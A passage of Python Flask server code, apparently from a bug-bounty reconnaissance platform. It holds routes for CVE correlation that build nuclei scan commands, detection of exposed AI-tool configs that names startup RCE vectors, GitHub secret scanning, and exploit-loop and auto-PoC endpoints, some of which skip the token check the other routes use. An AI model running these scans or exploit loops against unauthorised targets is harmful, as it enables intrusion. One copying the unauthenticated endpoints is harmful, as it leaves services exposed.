    events = query_events(org_id=org_id, since_ts=since, limit=10000)
    # Log the export itself
    audit("export_audit_log", CATEGORY_EXPORT,
          details={"days": days, "count": len(events)}, severity=SEV_NOTICE)
    fmt = request.args.get("format","json")
    if fmt == "csv":
        import io as _io
        import csv as _csv
        buf = _io.StringIO()
        if events:
            w = _csv.DictWriter(buf, fieldnames=list(events[0].keys()))
            w.writeheader(); w.writerows(events)
        return Response(buf.getvalue(), mimetype="text/csv",
                        headers={"Content-Disposition":
                                 f"attachment; filename=audit_{days}d.csv"})
    return jsonify({"events": events, "count": len(events),
                    "period_days": days, "exported_at": time.time()})



# ═══════════════════════════════════════════════════════════════════════════════
# CVE CORRELATION ENGINE
# Inspired by XBOW's CVE-2026-45185 Exim discovery:
# version-aware tech → CVE matching, banner parsing, nuclei template selection
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/cve/sync/status")
def cve_sync_status():
    """GET /cve/sync/status — current sync state, last run, total CVEs."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    from engine.cve_sync import get_sync_status
    from engine.cve_engine import get_cve_stats
    status = get_sync_status()
    stats  = get_cve_stats()
    return jsonify({
        **status,
        "db_stats": stats,
        "sources_available": ["cisa_kev","nvd","osv","github","epss"],
        "api_key_set": bool(os.environ.get("NVDAPIKEY","")),
        "tip": ("Set NVDAPIKEY env var for 10x faster NVD sync (50 req/30s vs 5)"
                if not os.environ.get("NVDAPIKEY") else "NVD API key active — full speed"),
    })


@app.route("/cve/sync", methods=["POST"])
def cve_sync_trigger():
    """
    POST /cve/sync  {"mode": "quick|startup|weekly"}

    Trigger a CVE database sync manually.

    quick   — CISA KEV only (~30 sec, 550 actively-exploited CVEs)
    startup — CISA KEV + NVD last 30 days + EPSS scores (~2 min)
    weekly  — All sources: NVD keywords + OSV + GitHub + EPSS (~10 min)

    Set NVDAPIKEY env var for 10x faster NVD syncing.

    CISA KEV = actively exploited in the wild RIGHT NOW — highest priority.
    EPSS     = exploit probability score, tells you which CVEs to prioritize.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_sync import start_background_sync, get_sync_status
    p    = request.get_json(silent=True) or {}
    mode = p.get("mode","startup").strip().lower()
    if mode not in ("quick","startup","weekly"): mode = "startup"

    status = get_sync_status()
    if status.get("running"):
        return jsonify({"ok": False, "reason": "sync already running",
                        "status": status}), 409

    start_background_sync(mode)
    return jsonify({
        "ok":      True,
        "mode":    mode,
        "message": f"CVE sync ({mode}) started in background",
        "poll":    "/cve/sync/status",
        "estimated_time": {
            "quick":   "~30 seconds (CISA KEV only)",
            "startup": "~2 minutes (CISA KEV + NVD 30d + EPSS)",
            "weekly":  "~10 minutes without API key, ~2 min with NVDAPIKEY",
        }[mode],
    })


@app.route("/cve/prioritize")
def cve_prioritize():
    """
    GET /cve/prioritize?domain=X

    Returns CVEs for a domain prioritized by:
    1. In CISA KEV (actively exploited NOW) — top priority
    2. High EPSS score (likely to be exploited soon)
    3. CVSS score
    4. Version match confidence

    This is the XBOW-style intelligence: not just "is this CVE possible"
    but "is this CVE being actively exploited against targets like yours"
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import correlate_domain_cves, get_nuclei_tags_for_cves
    domain = _domain(request.args.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400

    cves = correlate_domain_cves(domain, db)
    if not cves:
        return jsonify({"domain":domain,"cves":[],"note":"No tech detected. Run recon first."})

    # Fetch KEV and EPSS data from DB
    try:
        from engine.cve_engine import _db as _cdb
        conn = _cdb()
        kev_ids  = {r[0] for r in conn.execute(
            "SELECT cve_id FROM cve_cache WHERE in_kev=1").fetchall()}
        epss_map = {r[0]:r[1] for r in conn.execute(
            "SELECT cve_id, epss_score FROM cve_cache WHERE epss_score > 0").fetchall()}
    except Exception:
        kev_ids = set(); epss_map = {}

    # Enrich + score
    for cve in cves:
        cid = cve.get("cve_id","")
        cve["in_kev"]    = cid in kev_ids
        cve["epss"]      = epss_map.get(cid, 0.0)
        cve["epss_pct"]  = f"{epss_map.get(cid,0)*100:.1f}%"
        # Priority score: KEV=1000, EPSS*100, CVSS*10
        cve["priority_score"] = (
            (1000 if cve["in_kev"] else 0) +
            (cve["epss"] * 100) +
            (cve.get("cvss_score",0) * 10)
        )

    cves.sort(key=lambda x: -x.get("priority_score",0))

    kev_count  = sum(1 for c in cves if c.get("in_kev"))
    high_epss  = [c for c in cves if c.get("epss",0) > 0.1]
    tags, cids = get_nuclei_tags_for_cves(cves[:20])

    return jsonify({
        "domain":         domain,
        "total_cves":     len(cves),
        "in_kev":         kev_count,
        "high_epss":      len(high_epss),
        "cves":           cves[:30],
        "nuclei_command": (f"nuclei -target {domain} -id {','.join(cids[:5])}"
                           f" -severity critical,high -j" if cids else ""),
        "alert": (
            f"🔴 {kev_count} CVE(s) are in CISA KEV — being actively exploited in the wild"
            if kev_count > 0 else None
        ),
    })


@app.route("/cve/correlate")
def cve_correlate():
    """
    GET /cve/correlate?domain=example.com

    Correlates all detected tech for a domain against the CVE DB.
    Returns version-aware CVE matches with nuclei template suggestions.

    Flow: detected_tech + version → CVE DB match → nuclei tags → analyst review

    [cve] domain=example.com tech_count=8 cve_matches=12
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import correlate_domain_cves, get_nuclei_tags_for_cves, get_cve_stats
    domain = _domain(request.args.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400

    cves   = correlate_domain_cves(domain, db)
    crits  = [c for c in cves if c.get("severity") == "critical"]
    highs  = [c for c in cves if c.get("severity") == "high"]

    tags, cve_ids = get_nuclei_tags_for_cves(cves)

    # Auto-save critical CVEs as findings for analyst review
    for cve in crits[:10]:
        try:
            db.add_finding(domain, {
                "bug":        "cve",
                "severity":   "critical",
                "title":      f"{cve['cve_id']}: {cve.get('description','')[:80]}",
                "url":        f"https://{domain}",
                "confidence": 55 if not cve.get("version_matched") else 75,
                "cve_id":     cve["cve_id"],
                "tech":       cve.get("matched_from_tech",""),
                "tool":       "cve_engine",
                "note":       "Version-matched CVE — requires manual verification",
            })
        except Exception: pass

    return jsonify({
        "domain":       domain,
        "cve_count":    len(cves),
        "critical":     len(crits),
        "high":         len(highs),
        "cves":         cves[:50],
        "nuclei_tags":  tags,
        "nuclei_cve_ids": cve_ids[:10],
        "nuclei_command_hint": (
            f"nuclei -target {domain} -id {','.join(cve_ids[:5])} -severity critical,high -j"
            if cve_ids else
            f"nuclei -target {domain} -tags cve -severity critical,high -j"
        ),
        "note": "Confidence is lower without confirmed version. Run nuclei to confirm.",
    })


@app.route("/cve/scan", methods=["POST"])
def cve_scan():
    """
    POST /cve/scan  {"domain": "example.com", "severity": "critical,high"}

    Queues a nuclei CVE scan targeting CVEs matched for this domain.
    Uses version-aware CVE correlation to select the most relevant templates.
    Returns job info — scan runs via nuclei in background.

    Only runs templates that match detected tech. No spray.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import correlate_domain_cves, get_nuclei_tags_for_cves, build_nuclei_cve_command
    import shutil as _sh
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain",""))
    sev     = p.get("severity","critical,high")
    if not domain: return jsonify({"error":"domain required"}), 400

    cves     = correlate_domain_cves(domain, db)
    if not cves:
        return jsonify({"ok": False, "note": "No CVEs matched for this domain. Run recon first to detect tech stack."})

    tags, cve_ids = get_nuclei_tags_for_cves(cves)
    nuclei_bin = _sh.which("nuclei") or os.path.expanduser("~/go/bin/nuclei")

    # Build the nuclei command
    crits = [c for c in cves if c.get("severity") == "critical"]
    cmd   = build_nuclei_cve_command(domain, cves, nuclei_bin, sev)

    log.info(f"[cve] scan queued domain={domain} cves={len(cves)} cmd={cmd[:3]}...")

    # Queue via scan engine if available, else return command for manual use
    queued = False
    try:
        from scanner import run_scan as _rs
        import threading as _cvet, queue as _cveq
        q = _cveq.Queue()
        _cvet.Thread(target=_rs, args=(domain, ["cve"], q, db),
                     kwargs={"scan_speed":"normal"}, daemon=True).start()
        queued = True
    except Exception: pass

    return jsonify({
        "ok":            True,
        "domain":        domain,
        "cve_count":     len(cves),
        "critical_cves": len(crits),
        "cve_ids":       cve_ids[:10],
        "nuclei_tags":   tags,
        "queued":        queued,
        "nuclei_command": " ".join(cmd),
        "note":          "CVE scan uses probe-only nuclei templates. No exploit payloads.",
    })


@app.route("/cve/banner")
def cve_banner_parse():
    """
    GET /cve/banner?banner=OpenSSH_9.0p1+Ubuntu

    Parse a service banner string and return matched CVEs.
    Useful for SMTP/SSH/FTP banners from nmap output.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import parse_banner, match_cves
    banner = request.args.get("banner","").strip()
    if not banner: return jsonify({"error":"banner required"}), 400

    parsed = parse_banner(banner)
    all_cves = []
    for item in parsed:
        cves = match_cves(item["tech"], item["version"])
        for c in cves:
            c["banner_tech"] = item["tech"]
            c["banner_version"] = item["version"]
            all_cves.append(c)

    return jsonify({
        "banner":       banner,
        "parsed_tech":  parsed,
        "cves":         all_cves[:20],
        "cve_count":    len(all_cves),
    })


@app.route("/cve/feed", methods=["POST"])
def cve_feed():
    """
    POST /cve/feed  {"tech": "apache", "ecosystem": "PyPI"}

    Fetch live CVEs from NVD API for a given tech keyword.
    Results cached locally. Rate-limited — use sparingly.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import fetch_nvd_cves, fetch_osv_cves
    p    = request.get_json(silent=True) or {}
    tech = p.get("tech","").strip().lower()
    eco  = p.get("ecosystem","")
    if not tech: return jsonify({"error":"tech required"}), 400

    if eco:
        cves = fetch_osv_cves(tech, eco)
        source = "osv"
    else:
        cves = fetch_nvd_cves(tech)
        source = "nvd"

    return jsonify({
        "tech":   tech,
        "source": source,
        "count":  len(cves),
        "cves":   cves,
    })


@app.route("/cve/stats")
def cve_stats_route():
    """GET /cve/stats — CVE DB stats: total, by severity, by source."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import get_cve_stats
    return jsonify(get_cve_stats())


@app.route("/cve/domain_history")
def cve_domain_history():
    """GET /cve/domain_history?domain=X — previously matched CVEs for a domain."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.cve_engine import get_domain_cves
    domain = _domain(request.args.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400
    return jsonify({"domain": domain, "cves": get_domain_cves(domain)})



# ── AI Tool Attack Surface Scanner ───────────────────────────────────────────

@app.route("/scan/ai_tools")
def scan_ai_tools_route():
    """
    GET /scan/ai_tools?domain=example.com

    Dedicated AI developer tool attack surface scanner.
    Inspired by BugBunny's Gemini CLI RCE research (5 CVEs, Google VRP accepted).

    Scans for exposed:
    - Gemini CLI configs (/.gemini/settings.json, /.gemini/.env)
    - Cursor AI configs (/.cursor/settings.json, /.cursorrules)
    - Claude Code configs (/.claude/settings.json, CLAUDE.md)
    - MCP server definitions (mcp.json, .mcp/config.json)
    - Aider, Continue.dev, Codeium, Windsurf configs

    Critical vectors detected:
    - GEMINI_SANDBOX_PROXY_COMMAND in .env → RCE on startup
    - mcpServers.command → arbitrary shell on MCP connect
    - toolDiscoveryCommand → RCE before any UI shown

    Safe detection only — no exploitation.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from scanner import check_ai_tools
    domain = _domain(request.args.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400

    # Scan main domain + common subdomains where AI tools might be exposed
    targets = [f"https://{domain}", f"http://{domain}"]
    # Also check common dev/staging subdomains
    for prefix in ["dev","staging","api","app","code","git","gitlab","github"]:
        targets.append(f"https://{prefix}.{domain}")

    import concurrent.futures as _ait_cf
    all_findings = []
    with _ait_cf.ThreadPoolExecutor(max_workers=5) as exe:
        futs = {exe.submit(check_ai_tools, t): t for t in targets[:8]}
        for fut in _ait_cf.as_completed(futs, timeout=60):
            try:
                results = fut.result()
                all_findings.extend(results)
            except Exception: pass

    # Deduplicate by path
    seen = set()
    deduped = []
    for f in all_findings:
        key = f.get("url","") + f.get("path","")
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    crits = [f for f in deduped if f.get("severity") == "critical"]
    highs = [f for f in deduped if f.get("severity") == "high"]

    # Save findings to DB
    for f in deduped:
        try: db.add_finding(domain, f)
        except Exception: pass

    return jsonify({
        "domain":    domain,
        "total":     len(deduped),
        "critical":  len(crits),
        "high":      len(highs),
        "findings":  deduped,
        "research":  "BugBunny.ai found 5 RCE vulnerabilities in Gemini CLI using these vectors. "
                     "See: bugbunny.ai/blog/google-gemini-cli-rce-2025",
        "vectors_checked": [
            "GEMINI_SANDBOX_PROXY_COMMAND in .env (RCE on startup)",
            "mcpServers.command in settings.json (arbitrary shell execution)",
            "toolDiscoveryCommand (runs before any UI shown)",
            "AI tool directory listing",
            "Exposed API keys in AI tool configs",
        ],
    })



# ═══════════════════════════════════════════════════════════════════════════════
# HALL OF FAME — Public CVE / Responsible Disclosure Tracker
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/hof")
def hof_list():
    """
    GET /hof?severity=critical&limit=50

    Public Hall of Fame — CVEs and responsible disclosures discovered
    using TheMasterRecon AI. No auth required for public entries.
    """
    from engine.hall_of_fame import list_disclosures, get_hof_stats
    severity = request.args.get("severity","")
    limit    = min(int(request.args.get("limit","50")), 200)
    entries  = list_disclosures(public_only=True, severity=severity, limit=limit)
    stats    = get_hof_stats()
    return jsonify({
        "entries":  entries,
        "stats":    stats,
        "note":     "Responsibly disclosed vulnerabilities found using BugScan ELITE",
    })


@app.route("/hof/stats")
def hof_stats():
    from engine.hall_of_fame import get_hof_stats
    return jsonify(get_hof_stats())


@app.route("/hof/add", methods=["POST"])
def hof_add():
    """POST /hof/add — Add a disclosure to the Hall of Fame."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    from engine.hall_of_fame import add_disclosure
    p = request.get_json(silent=True) or {}
    if not p.get("title"): return jsonify({"error":"title required"}), 400
    entry = add_disclosure(p)
    return jsonify({"ok": True, "entry": entry}), 201


@app.route("/hof/promote/<finding_id>", methods=["POST"])
def hof_promote(finding_id):
    """Promote an approved finding to the Hall of Fame."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    from engine.hall_of_fame import promote_finding_to_hof
    p       = request.get_json(silent=True) or {}
    finding = db.get_finding(finding_id) if hasattr(db, "get_finding") else {}
    if not finding: return jsonify({"error":"finding not found"}), 404
    entry = promote_finding_to_hof(
        finding,
        researcher=p.get("researcher","Anonymous"),
        platform=p.get("platform",""),
        bounty_usd=int(p.get("bounty_usd",0)),
    )
    return jsonify({"ok": True, "hof_entry": entry})


# ═══════════════════════════════════════════════════════════════════════════════
# GITHUB REPOSITORY SCANNER — White-box source code analysis
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/scan/github", methods=["POST"])
def scan_github_repo():
    """
    POST /scan/github
    {"repo_url": "https://github.com/owner/repo", "token": "ghp_...", "max_files": 50}

    White-box source code security scanner for GitHub repositories.
    Detects: hardcoded secrets, SQLi, RCE, SSRF, LFI, deserialization,
             weak crypto, XSS patterns, vulnerable dependencies.

    Static analysis only — no exploitation. Public repos only unless token provided.
    Inspired by BugBunny's PR Review & Patch Suggestions feature.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.github_scanner import scan_repository
    p        = request.get_json(silent=True) or {}
    repo_url = p.get("repo_url","").strip()
    gh_token = p.get("github_token","") or os.environ.get("GITHUB_TOKEN","")
    max_files= min(int(p.get("max_files",50)), 200)

    if not repo_url: return jsonify({"error":"repo_url required"}), 400
    if "github.com" not in repo_url: return jsonify({"error":"GitHub URL required"}), 400

    import threading as _gt
    result_holder = {}
    def _run():
        result_holder["r"] = scan_repository(repo_url, token=gh_token, max_files=max_files)
    t = _gt.Thread(target=_run, daemon=True); t.start(); t.join(timeout=120)
    result = result_holder.get("r", {"error":"timeout","findings":[]})

    # Save findings to DB if domain provided
    domain = p.get("domain","")
    if domain and result.get("findings"):
        for f in result["findings"]:
            try:
                db.add_finding(domain, {
                    "bug":      f.get("bug_type",""),
                    "bug_type": f.get("bug_type",""),
                    "severity": f.get("severity","medium"),
                    "url":      repo_url,
                    "title":    f.get("description",""),
                    "source":   "github_scanner",
                    "file":     f.get("file",""),
                    "line":     f.get("line",0),
                    "code":     f.get("code",""),
                })
            except Exception: pass

    return jsonify(result)


@app.route("/scan/github/secrets", methods=["POST"])
def scan_github_secrets():
    """
    POST /scan/github/secrets
    {"repo_url": "...", "github_token": "..."}

    Quick scan focused only on hardcoded secrets — fastest path to critical findings.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.github_scanner import scan_repository, parse_github_url, get_repo_info
    from engine.github_scanner import list_repo_files, scan_file_content, _gh_get_text
    p        = request.get_json(silent=True) or {}
    repo_url = p.get("repo_url","").strip()
    gh_token = p.get("github_token","") or os.environ.get("GITHUB_TOKEN","")
    if not repo_url: return jsonify({"error":"repo_url required"}), 400

    owner, repo = parse_github_url(repo_url)
    if not owner: return jsonify({"error":"invalid GitHub URL"}), 400

    # Only scan secret-prone files
    SECRET_FILES = [".env",".env.example",".env.local","config.py","settings.py",
                    "config.js","config.json","secrets.yml","credentials.json",
                    "application.properties","database.yml"]
    files = list_repo_files(owner, repo, token=gh_token)
    secret_files = [f for f in files
                    if any(f.get("name","") == sf for sf in SECRET_FILES)
                    or f.get("name","").endswith((".env",".key",".pem",".p12"))]

    secrets_found = []
    for finfo in secret_files[:20]:
        content = _gh_get_text(finfo.get("download_url",""), gh_token)
        if content:
            findings = scan_file_content(content, finfo.get("path",""))
            secrets_found.extend(f for f in findings if f.get("bug_type")=="hardcoded_secret")

    return jsonify({
        "repo":           f"{owner}/{repo}",
        "files_checked":  len(secret_files),
        "secrets_found":  len(secrets_found),
        "findings":       secrets_found,
        "note":           "Rotate any exposed credentials immediately.",
    })


# ═══════════════════════════════════════════════════════════════════════════════
# CONTINUOUS SCAN — 4x daily automated scanning (BugBunny-style)
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/continuous/schedule", methods=["POST"])
def continuous_schedule():
    """
    POST /continuous/schedule
    {"domain": "example.com", "frequency": "4x_daily|daily|weekly",
     "bugs": ["xss","sqli","rce","expose"], "org_id": "..."}

    Schedule continuous automated scanning — like BugBunny's Continuous Bug Scan.
    4x daily = scans at 00:00, 06:00, 12:00, 18:00 UTC.
    Daily = once per day.
    Weekly = once per week.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    p         = request.get_json(silent=True) or {}
    domain    = _domain(p.get("domain",""))
    frequency = p.get("frequency","daily")
    bugs      = p.get("bugs", ["xss","sqli","rce","expose","ssrf","idor","actuator"])
    org_id    = p.get("org_id","")
    if not domain: return jsonify({"error":"domain required"}), 400

    # Map frequency to interval_h
    interval_h = {"4x_daily": 6, "twice_daily": 12,
                   "daily": 24, "weekly": 168}.get(frequency, 24)

    from engine.monitoring import create_job as mon_create_job
    job = mon_create_job(
        domain=domain,
        org_id=org_id,
        name=f"Continuous {frequency} — {domain}",
        interval_h=interval_h,
        alert_on=["new_finding","new_subdomain","score_change"],
        notify_channels=["discord","telegram"],
        options={"bugs": bugs, "scan_mode": "continuous",
                 "frequency": frequency, "bugbunny_style": True},
    )

    return jsonify({
        "ok":            True,
        "job":           job,
        "frequency":     frequency,
        "interval_h":    interval_h,
        "next_scans":    [
            time.strftime("%Y-%m-%d %H:%M UTC",
                          time.gmtime(time.time() + interval_h*3600*i))
            for i in range(1, 5)
        ],
        "message": (
            f"Continuous scanning scheduled — {domain} will be scanned "
            f"{'every 6 hours' if frequency=='4x_daily' else 'every '+str(interval_h)+'h'}. "
            f"Alerts via Discord/Telegram when new findings are detected."
        ),
    }), 201


@app.route("/continuous/jobs")
def continuous_jobs():
    """GET /continuous/jobs — List all continuous scan schedules."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    from engine.monitoring import list_jobs as mon_list_jobs
    org_id = request.args.get("org_id","")
    jobs   = mon_list_jobs(org_id=org_id)
    # Enrich with next scan time
    for job in jobs:
        nxt = job.get("next_run_at",0)
        job["next_run_human"] = time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime(nxt)) if nxt else "soon"
        job["overdue"] = nxt < time.time() if nxt else False
    return jsonify({"jobs": jobs, "count": len(jobs)})


# CVSS route upgrade — full vector with BugBunny-style display
@app.route("/findings/cvss/<path:domain>")
def findings_cvss(domain):
    """GET /findings/cvss/domain — CVSS v3.1 vectors for all findings (BugBunny style)."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    d = _domain(domain)
    findings = db.get_findings(d)
    result = []
    for f in findings:
        result.append({
            "id":           f.get("id",""),
            "title":        f.get("title",""),
            "bug_type":     f.get("bug_type", f.get("bug","")),
            "severity":     f.get("severity",""),
            "cvss_score":   f.get("cvss_score", f.get("cvss",0)),
            "cvss_vector":  f.get("cvss_vector",""),
            "cvss_display": f.get("cvss_display",""),
            "cwe_id":       f.get("cwe_id",""),
            "url":          f.get("url",""),
        })
    result.sort(key=lambda x: -float(x.get("cvss_score",0) or 0))
    return jsonify({"domain":d, "findings":result, "count":len(result)})



# ═══════════════════════════════════════════════════════════════════════════════
# SAFE POC VALIDATION ENGINE — TASK 1-7
# Analyst-ready evidence generation with human approval gate
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/xbow/grade", methods=["POST"])
def xbow_grade_finding():
    """
    POST /xbow/grade
    XBOW-style evidence quality check on a finding.
    Body: {finding: {...}, authorized_domain: "example.com"}
    Returns: grade (A-F), verdict, evidence_score, missing, analyst_note
    """
    if not _XBOW_ENABLED:
        return jsonify({"error": "XBOW validator not loaded"}), 503
    payload  = request.get_json(silent=True, force=True) or {}
    finding  = payload.get("finding", {})
    if not finding:
        return jsonify({"error": "finding required"}), 400
    try:
        result = validate_evidence(finding)
        # Also add Mythos analysis
        result["root_cause"] = analyze_root_cause(finding)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/mythos/exploit_loop", methods=["POST"])
def mythos_exploit_loop():
    """
    POST /mythos/exploit_loop
    Run Mythos-style iterative exploitation loop on a finding.
    Body: {finding: {...}}
    Returns: attack_path, escalation_chains, proof_requirements, bounty_argument
    """
    if not _ELITE_LOOP:
        return jsonify({"error": "Mythos loop not loaded"}), 503
    payload = request.get_json(silent=True, force=True) or {}
    finding = payload.get("finding", {})
    if not finding:
        return jsonify({"error": "finding required"}), 400
    try:
        result = run_exploitation_loop(finding,
                    max_steps=int(payload.get("max_steps", 3)))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/hacktron/analyze_code", methods=["POST"])
def hacktron_analyze_code():
    """
    POST /hacktron/analyze_code
    Hacktron-style source code vulnerability analysis.
    Body: {code: "...", language: "python", context: "..."}
    Returns: vulnerabilities with PoC + patch for each
    """
    if not _ELITE_LOOP:
        return jsonify({"error": "Hacktron analyzer not loaded"}), 503
    payload  = request.get_json(silent=True, force=True) or {}
    code     = payload.get("code", "")
    language = payload.get("language", "python")
    context  = payload.get("context", "")
    if not code:
        return jsonify({"error": "code required"}), 400
    try:
        result = analyze_code_target(code, language, context)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/hacktron/poc_gtfo", methods=["POST"])
def hacktron_poc_gtfo():
    """
    POST /hacktron/poc_gtfo
    Enforce PoC||GTFO on a finding or batch of findings.
    Body: {finding: {...}} OR {findings: [...]}
    Returns: passed, reason, updated finding with auto-generated PoC + patch
    """
    if not _ELITE_LOOP:
        return jsonify({"error": "PoC||GTFO gate not loaded"}), 503
    payload  = request.get_json(silent=True, force=True) or {}
    findings = payload.get("findings")
    finding  = payload.get("finding")
    try:
        if findings:
            result = batch_enforce_poc(findings)
            return jsonify(result)
        elif finding:
            passed, reason, updated = enforce_poc_gtfo(finding)
            if not updated.get("poc") or len(str(updated.get("poc",""))) < 20:
                updated["poc"] = auto_generate_poc(updated) or updated.get("poc","")
            updated["_patch_suggestion"] = generate_patch_suggestion(updated)
            return jsonify({
                "passed":   passed,
                "reason":   reason,
                "finding":  updated,
            })
        else:
            return jsonify({"error": "finding or findings required"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/xbow/replay", methods=["POST"])
def xbow_replay():
    """
    POST /xbow/replay
    Replay a finding to confirm it's still live or was fixed.
    Body: {finding: {...}} OR {domain: "example.com", min_severity: "medium"}
    Returns: status, still_vulnerable, replay_evidence
    """
    if not _ELITE_LOOP:
        return jsonify({"error": "XBOW replay not loaded"}), 503
    payload  = request.get_json(silent=True, force=True) or {}
    finding  = payload.get("finding")
    domain   = _domain(payload.get("domain", ""))
    try:
        if finding:
            result = replay_finding(finding)
            return jsonify(result)
        elif domain:
            findings = db.get_findings(domain)
            min_sev  = payload.get("min_severity", "medium")
            result   = batch_replay(findings, domain, min_sev)
            return jsonify(result)
        else:
            return jsonify({"error": "finding or domain required"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/xbow/batch_grade", methods=["POST"])
def xbow_batch_grade():
    """
    POST /xbow/batch_grade
    Grade all findings for a domain.
    Body: {domain: "example.com"} or {findings: [...]}
    Returns sorted findings with grades, stats, report_ready count
    """
    if not _XBOW_ENABLED:
        return jsonify({"error": "XBOW validator not loaded"}), 503
    payload  = request.get_json(silent=True, force=True) or {}
    findings = payload.get("findings")
    if not findings:
        domain   = _domain(payload.get("domain", ""))
        if not domain:
            return jsonify({"error": "domain or findings required"}), 400
        findings = db.get_findings(domain)
    try:
        result = batch_validate_evidence(findings)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/mythos/analyze", methods=["POST"])
def mythos_analyze():
    """
    POST /mythos/analyze
    Mythos-style root cause analysis for a finding.
    Body: {finding: {...}}
    Returns: broken_assumption, trust_boundary, chain_paths, hypothesis
    """
    if not _XBOW_ENABLED:
        return jsonify({"error": "Mythos analyzer not loaded"}), 503
    payload = request.get_json(silent=True, force=True) or {}
    finding = payload.get("finding", {})
    if not finding:
        return jsonify({"error": "finding required"}), 400
    try:
        analysis = analyze_root_cause(finding)
        narrative = generate_mythos_report(finding)
        return jsonify({**analysis, "narrative": narrative})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/validate/poc", methods=["POST"])
def validate_poc_route():
    """
    POST /validate/poc
    {"finding": {...}, "authorized_domain": "example.com"}

    Runs validate_poc_safe() on a finding within authorized scope only.
    Returns structured validation result — never exploits, never extracts.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.ai_validator import validate_poc_safe
    p = request.get_json(silent=True) or {}
    finding           = p.get("finding", {})
    authorized_domain = p.get("authorized_domain", "")

    if not finding or not finding.get("url"):
